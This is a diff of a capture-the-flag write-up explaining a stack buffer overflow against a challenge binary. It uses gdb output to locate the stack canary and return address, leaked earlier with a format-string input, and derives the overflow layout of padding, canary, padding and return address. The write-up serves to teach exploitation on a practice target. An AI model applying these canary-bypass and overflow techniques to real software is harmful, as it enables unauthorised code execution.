@@ -56,7 +56,39 @@ gdb-peda$ p main - print_flag
 $3 = 0x79
 ```
 
-Now we have everything we need. First, we leak the canary and main address, and then when we perform our buffer overflow, we overwrite the canary and then the return address. Refer to [babyret2win.md](https://github.com/jdabtieu/LyonCTF-white_flag/blob/main/babyret2win.md) for information on finding the return location. The canary will be 16 bytes before the return. Alternatively, we could just read how many stack entries we must overwrite before getting to the return address (`<__libc_start_main+243>:       mov    edi,eax`)
+Now we have everything we need. First, we leak the canary and main address, and then when we perform our buffer overflow, we overwrite the canary and then the return address. 
+
+Now, we need to figure out how to structure our overflow to contain the cookie. If we advance the program instruction-by-instruction until the `gets` line, we can examine where on the stack it reads onto, and also how far it is until we need to overwrite.
+```
+=> 0x563a79b953d6 <main+308>:   call   0x563a79b95100 <gets@plt>
+   0x563a79b953db <main+313>:   mov    eax,0x0
+   0x563a79b953e0 <main+318>:   mov    rcx,QWORD PTR [rbp-0x8]
+   0x563a79b953e4 <main+322>:   xor    rcx,QWORD PTR fs:0x28
+   0x563a79b953ed <main+331>:   je     0x563a79b953f4 <main+338>
+Guessed arguments:
+arg[0]: 0x7ffc606759e0 --> 0xc2 
+```
+This shows us that `gets` will start reading to this stack address. We can then count how far down the cookie and return address is, staring from this address.
+
+```
+gdb-peda$ stack 25
+0000| 0x7ffc606759d0 --> 0x563a79b94040 --> 0x400000006 
+0008| 0x7ffc606759d8 --> 0xf0b5ff 
+1   | 0x7ffc606759e0 --> 0xc2 
+2   | 0x7ffc606759e8 --> 0x7ffc60675a17 --> 0x563a79b9514000 
+3   | 0x7ffc606759f0 --> 0x7ffc60675a16 --> 0x563a79b951400000 
+4   | 0x7ffc606759f8 --> 0x563a79b9544d (<__libc_csu_init+77>:  add    rbx,0x1)
+5   | 0x7ffc60675a00 ("%17$p %23$p\n")
+6   | 0x7ffc60675a08 --> 0x56000a702433 ('3$p\n')
+7   | 0x7ffc60675a10 --> 0x0 
+8   | 0x7ffc60675a18 --> 0x563a79b95140 (<_start>:      endbr64)
+9   | 0x7ffc60675a20 --> 0x7ffc60675b20 --> 0x1 
+CAN | 0x7ffc60675a28 --> 0x5ef5e94018a11000 
+11  | 0x7ffc60675a30 --> 0x0 
+RET | 0x7ffc60675a38 --> 0x7f42abc480b3 (<__libc_start_main+243>:       mov    edi,eax)
+```
+
+This tells us that we need to write 9\*8 bytes of garbage, followed by the stack canary, followed by 8 more garbage bytes, and then the return address.
 
 ```py
 from pwn import *
